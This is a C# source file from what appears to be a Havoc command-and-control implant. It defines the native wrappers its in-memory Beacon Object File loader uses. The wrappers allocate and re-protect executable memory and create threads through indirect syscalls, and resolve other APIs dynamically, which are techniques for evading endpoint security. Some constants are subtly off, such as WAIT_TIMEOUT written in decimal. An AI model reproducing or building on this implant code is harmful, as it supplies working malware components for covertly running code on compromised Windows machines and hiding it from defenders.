using Microsoft.Win32.SafeHandles;
using HavocImplant.NativeUtils;
using System;
using System.Diagnostics;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using static HavocImplant.NativeUtils.Structs.Win32.Enums;

namespace HavocImplant.AgentFunctions.BofExec.Internals
{
    class NativeDeclarations
    {


        internal const uint MEM_COMMIT = 0x1000;
        internal const uint MEM_RESERVE = 0x2000;
        internal const uint MEM_RELEASE = 0x00008000;



        internal const uint PAGE_EXECUTE_READWRITE = 0x40;
        internal const uint PAGE_READWRITE = 0x04;
        internal const uint PAGE_EXECUTE_READ = 0x20;
        internal const uint PAGE_EXECUTE = 0x10;
        internal const uint PAGE_EXECUTE_WRITECOPY = 0x80;
        internal const uint PAGE_NOACCESS = 0x01;
        internal const uint PAGE_READONLY = 0x02;
        internal const uint PAGE_WRITECOPY = 0x08;

        internal const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
        internal const uint IMAGE_SCN_MEM_READ = 0x40000000;
        internal const uint IMAGE_SCN_MEM_WRITE = 0x80000000;

        // Originally used VirtualAlloc, made a wrapper for less overhead
        public static IntPtr NtAllocateVirtualMemory(IntPtr baseAddress, uint RegionSize, uint allocationType, uint protect )
        {
            object[] args = new object[] { (IntPtr)(-1), baseAddress, IntPtr.Zero, (IntPtr)RegionSize, allocationType, protect  };
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtAllocateVirtualMemory>("NtAllocateVirtualMemory", args);
            return (IntPtr)args[1];
        }
        // Originally used VirtualFree, made a wrapper for less overhead
        public static bool NtFreeVirtualMemory(IntPtr pAddress, uint size, uint freeType)
        {
            object[] args = new object[] { (IntPtr)(-1), pAddress, (IntPtr)size, freeType};
            uint status = (uint)globalDll.ntdll.indirectSyscallInvoke<Delegates.NtFreeVirtualMemory>("NtFreeVirtualMemory", args);
            //if ((status >= 0 && status <= 0x3FFFFFFF) || (status >= 0x40000000 && status <= 0x7FFFFFFF)) return true; 
            if (status == 0) return true; //idk which one is the real ntstatus success
            return false;
        }

        public static bool HeapFree(IntPtr hHeap, uint dwFlags, IntPtr lpMem)
        {
            return (bool)Utils.dynamicAPIInvoke<Delegates.HeapFree>("kernel32.dll", "HeapFree",new object[] { hHeap, dwFlags, lpMem });
        }
        public static IntPtr GetProcessHeap()
        {
            return (IntPtr)Utils.dynamicAPIInvoke<Delegates.GenericPtr>("kernel32.dll", "GetProcessHeap", new object[] {});
        }
        public static IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes)
        {
            return (IntPtr)Utils.dynamicAPIInvoke<Delegates.HeapAlloc>("kernel32.dll", "HeapAlloc", new object[] { hHeap , dwFlags, dwBytes});
        }

        public static IntPtr LoadLibrary(string fileName)
        {
            return (IntPtr)Utils.dynamicAPIInvoke<Delegates.LoadLibraryA>("kernel32.dll", "LoadLibraryA", new object[] { fileName });
        }
        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            return Utils.getFuncLocation(hModule, procName);
        }
        // Originally used CreateThread, made a wrapper for less overhead
        public static IntPtr NtCreateThreadEx(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId)
        {
            IntPtr hThread = IntPtr.Zero;
            object[] threadargs = new object[] { hThread, (uint)0x02000000, IntPtr.Zero, (IntPtr)(-1), lpStartAddress, param, false, 0, 0, 0, lpThreadAttributes };
            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtCreateThreadEx>("NtCreateThreadEx", threadargs);
            return (IntPtr)threadargs[0];
        }

        // Originally used VirtualProtect, made a wrapper for less overhead
        public static bool NtProtectVirtualMemory(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            lpflOldProtect = 0;
            object[] args = new object[] { (IntPtr)(-1), lpAddress, (IntPtr)(long)dwSize, flNewProtect, lpflOldProtect };
            uint status = (uint)globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", args);
            lpflOldProtect = (uint)args[4];
            if (status == 0) return true;
            return false;
        }
        public static uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds)
        {
            return (uint)Utils.dynamicAPIInvoke<Delegates.WaitForSingleObject>("kernel32.dll", "WaitForSingleObject", new object[] { hHandle, dwMilliseconds});
        }
        public static bool GetExitCodeThread(IntPtr hThread, out int lpExitcode)
        { 
            lpExitcode = 0;
            object[] args = new object[] { hThread, lpExitcode };
            bool retVal = (bool)Utils.dynamicAPIInvoke<Delegates.GetExitCodeThread>("kernel32.dll", "GetExitCodeThread", args);
            lpExitcode = (int)args[1];
            return retVal;
        }
        public static void ZeroMemory(IntPtr dest, int size)
        {
            Utils.dynamicAPIInvoke<Delegates.ZeroMemory>("kernel32.dll", "RtlZeroMemory", new object[] { dest, size }); ;
        }



        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING : IDisposable
        {
            public ushort Length;
            public ushort MaximumLength;
            private IntPtr buffer;

            public UNICODE_STRING(string s)
            {
                Length = (ushort)(s.Length * 2);
                MaximumLength = (ushort)(Length + 2);
                buffer = Marshal.StringToHGlobalUni(s);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(buffer);
                buffer = IntPtr.Zero;
            }

            public override string ToString()
            {
                return Marshal.PtrToStringUni(buffer);
            }

        }

            public enum AllocationProtectEnum : uint
            {
                PAGE_EXECUTE = 0x00000010,
                PAGE_EXECUTE_READ = 0x00000020,
                PAGE_EXECUTE_READWRITE = 0x00000040,
                PAGE_EXECUTE_WRITECOPY = 0x00000080,
                PAGE_NOACCESS = 0x00000001,
                PAGE_READONLY = 0x00000002,
                PAGE_READWRITE = 0x00000004,
                PAGE_WRITECOPY = 0x00000008,
                PAGE_GUARD = 0x00000100,
                PAGE_NOCACHE = 0x00000200,
                PAGE_WRITECOMBINE = 0x00000400
            }

            public enum HeapAllocFlags : uint
            {
            HEAP_GENERATE_EXCEPTIONS = 0x00000004,
            HEAP_NO_SERIALIZE = 0x00000001,
            HEAP_ZERO_MEMORY = 0x00000008,

            }

        public enum WaitEventEnum : uint
        {
            WAIT_ABANDONED = 0x00000080,
            WAIT_OBJECT_0 = 00000000,
            WAIT_TIMEOUT  = 00000102,
            WAIT_FAILED = 0xFFFFFFFF,
        }

            public enum StateEnum : uint
            {
                MEM_COMMIT = 0x1000,
                MEM_FREE = 0x10000,
                MEM_RESERVE = 0x2000
            }

            public enum TypeEnum : uint
            {
                MEM_IMAGE = 0x1000000,
                MEM_MAPPED = 0x40000,
                MEM_PRIVATE = 0x20000
            }

            public struct MEMORY_BASIC_INFORMATION
            {
                public IntPtr BaseAddress;
                public IntPtr AllocationBase;
                public AllocationProtectEnum AllocationProtect;
                public IntPtr RegionSize;
                public StateEnum State;
                public AllocationProtectEnum Protect;
                public TypeEnum Type;
            }
        }



    }

